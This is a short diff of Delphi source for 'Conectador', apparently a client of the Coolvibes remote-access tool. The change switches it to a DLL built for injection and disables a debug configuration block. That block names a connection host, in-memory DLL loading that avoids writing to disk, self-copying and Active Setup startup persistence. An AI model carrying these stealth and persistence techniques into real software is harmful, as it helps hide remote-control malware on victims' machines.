@@ -11,8 +11,8 @@
 
      El equipo Coolvibes
 *)
-//library Conectador; //Para inyectar descomentar
-program Conectador; //Para no inyectar descomentar
+library Conectador; //Para inyectar descomentar
+//program Conectador; //Para no inyectar descomentar
 uses
   Windows,
   BTMemoryModule, //Para cargar una DLL en memoria sin escribir en disco
@@ -320,8 +320,8 @@ begin
       else
       begin
         //Para Debug
-        //Exitprocess(0);
-        Configuracion.sHosts                  := 'localhost:77¬';
+        Exitprocess(0);
+        {Configuracion.sHosts                  := 'localhost:77¬';
         Configuracion.sID                     := 'v';
         Configuracion.bCopiarArchivo          := false;
         Configuracion.sFileNameToCopy         := 'w.exe';
@@ -333,8 +333,8 @@ begin
         Configuracion.bArranqueActiveSetup    := false;
         Configuracion.sActiveSetupKeyName     := '{t';
         Configuracion.sPluginName             := 's.dll';
-				//Configuracion.sInyectadorFile         := '';  
-        dllc := GetCurrentDirectory+Configuracion.sPluginName;
+				//Configuracion.sInyectadorFile         := '';
+        dllc := GetCurrentDirectory+Configuracion.sPluginName;  }
         //Fin de Para debug
       end;
   end;
